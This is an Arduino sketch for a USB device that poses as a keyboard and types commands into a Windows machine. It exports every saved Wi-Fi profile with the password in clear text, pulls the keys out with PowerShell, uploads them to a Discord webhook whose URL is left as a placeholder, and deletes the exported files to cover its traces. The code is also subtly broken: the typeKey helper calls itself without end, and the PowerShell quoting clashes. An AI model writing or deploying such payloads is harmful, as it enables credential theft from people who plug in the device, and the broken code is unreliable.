#include "HID.h"
#include <Keyboard.h>


// Utility function to type a key with a delay
void typeKey(int key){
  typeKey(key);
  delay(500); // Espera para asegurar que la tecla se registre
  Keyboard.release(key);
}

// Init function
void setup() {
  Keyboard.begin();
   
  delay(400);
  typeKey(KEY_LEFT_GUI);
  delay(300); // Mantiene presionada la tecla Windows
  typeKey('r'); // Presiona 'r' para abrir el cuadro de diálogo Ejecutar
  Keyboard.releaseAll(); // Libera todas las teclas
  delay(400);

  Keyboard.print("cmd /k");
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("cd %temp%");
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("netsh wlan export profile key=clear folder=%temp%");
  typeKey(KEY_RETURN);
  delay(1200);

  Keyboard.print("powershell");
  typeKey(KEY_RETURN);

  Keyboard.print("-Command 'Get-ChildItem -Filter *.xml | ForEach-Object { Select-String -Path $_.FullName -Pattern '<keyMaterial>(.*?)</keyMaterial>' } | ForEach-Object { $_.Matches.Groups[1].Value } | Sort-Object -Unique > WiFi-PASS'");
  typeKey(KEY_RETURN);
  delay(750);

  Keyboard.print("powershell Invoke-WebRequest -Uri <discord_webhook> -Method POST -InFile WiFi-PASS"); //poner la url
  typeKey(KEY_RETURN);
  delay(750);

  Keyboard.print("del *.xml /s /f /q");
  typeKey(KEY_RETURN);

  Keyboard.print("exit");
  //typeKey(KEY_RETURN);

  Keyboard.end();
}

// Unused loop function
void loop() {}
